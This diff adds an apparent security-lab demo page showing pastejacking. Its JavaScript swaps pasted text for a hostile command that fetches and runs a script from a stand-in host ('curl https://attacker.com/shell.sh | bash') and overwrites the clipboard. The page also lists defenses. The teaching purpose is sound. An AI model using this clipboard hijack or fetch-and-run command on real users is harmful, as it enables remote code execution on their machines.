@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo 16 — Pastejacking | ZENTRIX Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/lab.css">
+<style>
+.paste-stage { padding: 30px; position: relative; min-height: 300px; }
+.decoy-text {
+    background: rgba(0,255,102,0.05);
+    border: 1px solid var(--lab-border);
+    padding: 20px; font-size: 0.85rem; color: var(--lab-text);
+    line-height: 1.6; user-select: all;
+}
+.paste-trap {
+    position: absolute; inset: 0;
+    opacity: 0; z-index: 10;
+    cursor: text;
+}
+</style>
+</head>
+<body class="lab-demo">
+<div class="lab-warning">⚠ DEMO 16 — Pastejacking | Authorized research only</div>
+<nav class="lab-nav">
+    <a href="index.html">← VULN LAB</a>
+    <span class="demo-id">DEMO 16 / PASTEJACKING</span>
+    <a href="../index.html">CONSOLE</a>
+</nav>
+
+<div class="lab-body">
+    <h1 class="lab-title">PASTEJACKING</h1>
+    <span class="lab-tag">CLIPBOARD HIJACK · CTRL+V</span>
+    <p class="lab-desc">
+        User copies legitimate command from page. On paste, JavaScript intercepts and replaces
+        clipboard with malicious payload (e.g., curl | bash reverse shell).
+    </p>
+
+    <div class="lab-stage paste-stage">
+        <span class="lab-stage-label">[ COPY TEXT BELOW, THEN PASTE IN BOX ]</span>
+        <div class="decoy-text" id="decoy">sudo apt update && sudo apt upgrade -y</div>
+        <p style="color:var(--lab-text);font-size:0.8rem;margin:16px 0">Paste destination:</p>
+        <textarea class="lab-input" id="pasteBox" rows="3" style="max-width:100%" placeholder="Press Ctrl+V here..."></textarea>
+        <div class="paste-trap" id="pasteTrap" tabindex="0"></div>
+    </div>
+    <button class="lab-btn danger" id="armBtn">Arm pastejacking trap</button>
+    <div class="lab-log" id="log">[*] Copy the command above, arm trap, then paste in textarea...</div>
+</div>
+
+<div class="lab-info">
+    <strong>Defense:</strong> Paste into plain text editor first; verify commands; browsers limit programmatic clipboard write without gesture.
+</div>
+
+<script>
+var armed = false;
+var malicious = 'curl https://attacker.com/shell.sh | bash';
+
+document.getElementById('armBtn').addEventListener('click', function() {
+    armed = true;
+    document.getElementById('log').innerHTML = '<span class="hit">[!] TRAP ARMED</span>\nOn paste, clipboard will be replaced with malicious command.';
+});
+
+document.getElementById('pasteBox').addEventListener('paste', function(e) {
+    if (!armed) return;
+    e.preventDefault();
+    var injected = malicious;
+    e.target.value = injected;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(injected);
+    }
+    document.getElementById('log').innerHTML =
+        '<span class="hit">[!] PASTEJACK SUCCESSFUL</span>\n\n' +
+        'You copied: sudo apt update...\n' +
+        'Pasted instead: ' + injected + '\n\n' +
+        '<span class="ok">Clipboard overwritten with attacker payload</span>';
+});
+
+document.getElementById('decoy').addEventListener('copy', function() {
+    document.getElementById('log').textContent = '[*] Legitimate command copied to clipboard...';
+});
+</script>
+</body>
+</html>
